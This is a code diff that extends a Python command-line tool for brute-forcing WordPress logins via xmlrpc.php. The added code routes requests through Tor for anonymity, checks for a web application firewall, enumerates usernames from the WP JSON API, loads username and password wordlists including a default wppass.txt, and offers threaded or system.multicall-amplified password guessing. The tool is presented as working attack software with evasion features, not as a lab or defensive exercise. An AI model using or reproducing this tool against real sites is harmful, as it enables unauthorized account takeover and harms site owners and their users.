@@ -17,8 +17,6 @@ from aiohttp_socks import (
     ProxyConnector,
     ProxyType,
 )  # Import the ProxyConnector and ProxyType
-from xmlrpc import check_xmlrpc_available
-from bruteforce import brute_force_login
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
@@ -415,20 +413,96 @@ async def check_for_waf(url, session, use_tor=False):
 
 async def main():
     banner.print_banner()
-    url = input("Enter the target WordPress website URL: ")
-    async with aiohttp.ClientSession() as session:
+    url = input(
+        f"{Fore.YELLOW}Enter the target WordPress website URL (e.g., https://example.com): "
+    )
+    use_tor = input(f"{Fore.YELLOW}Do you want to use Tor? (y/n): ").lower() == "y"
+    if use_tor:
+        print_colored_bold(
+            f"{Fore.YELLOW}Using Tor to anonymize the requests", color="yellow"
+        )
+
+    if use_tor:
+        parsed_url = urlparse("socks5://127.0.0.1:9050")
+        connector = ProxyConnector(
+            proxy_type=ProxyType.SOCKS5,
+            host=parsed_url.hostname,
+            port=parsed_url.port,
+        )
+    else:
+        connector = None
+
+    async with aiohttp.ClientSession(connector=connector) as session:
+
+        waf_detected = await check_for_waf(url, session)
+        if waf_detected:
+            print(f"{Fore.YELLOW}WAF detected, proceed with caution")
+
         if await check_xmlrpc_available(url + "/xmlrpc.php", session):
-            print("xmlrpc.php is available, proceeding with brute-force!")
-            # Example usage of brute_force_login
-            username = input("Enter username: ")
-            password = input("Enter password: ")
-            response_text, response_time, status = await brute_force_login(url + "/xmlrpc.php", username, password, session)
-            if status == 200:
-                print(f"Login attempt response: {response_text}")
-            else:
-                print("Login attempt failed.")
+            print_colored_bold(
+                f"{Fore.GREEN}xmlrpc.php is available, proceeding with brute-force!",
+                color="green",
+            )
         else:
-            print("xmlrpc.php is not available. Exiting...")
+            print(f"{Fore.RED}xmlrpc.php is not available. Exiting...")
+            return
+
+        use_wp_api = input(
+            f"{Fore.YELLOW}Do you want to list users from WP JSON API? (y/n): "
+        ).lower()
+
+        if use_wp_api == "y":
+            users = await get_wp_users(url, session)
+            if users:
+                print(f"{Fore.CYAN}Found users: {', '.join(users)}")
+            else:
+                print(f"{Fore.RED}No users found from WP API.")
+                return
+        else:
+            username_choice = input(
+                f"{Fore.YELLOW}Do you want to provide a username file or enter manually? (f/m): "
+            ).lower()
+            if username_choice == "f":
+                username_file = input(
+                    f"{Fore.YELLOW}Enter the path to the username file: "
+                )
+                with open(username_file, "r") as file:
+                    users = [line.strip() for line in file.readlines()]
+            else:
+                users = [input(f"{Fore.YELLOW}Enter a username: ")]
+
+        password_choice = input(
+            f"{Fore.YELLOW}Do you want to provide a password file or use default (wppass.txt)? (f/d): "
+        ).lower()
+        if password_choice == "f":
+            password_file = input(f"{Fore.YELLOW}Enter the path to the password file: ")
+            with open(password_file, "r") as file:
+                passwords = [line.strip() for line in file.readlines()]
+        else:
+            if os.path.exists("wppass.txt"):
+                with open("wppass.txt", "r") as file:
+                    passwords = [line.strip() for line in file.readlines()]
+            else:
+                print(
+                    f"{Fore.RED}Default password file (wppass.txt) not found. Exiting..."
+                )
+                return
+
+        threads = int(input(f"{Fore.YELLOW}Enter the number of threads to use: "))
+
+        multicall_choice = input(
+            f"{Fore.YELLOW}Do you want to use system.multicall? (y/n): "
+        ).lower()
+
+        if multicall_choice == "y":
+            response_time = await start_multicall_async(
+                url + "/xmlrpc.php", users, passwords, session
+            )
+            if response_time:
+                logging.info("Analyzing response times")
+                await analyze_response_times([response_time])
+        else:
+            await start_bruteforce_async(url + "/xmlrpc.php", users, passwords, threads)
 
 
 if __name__ == "__main__":
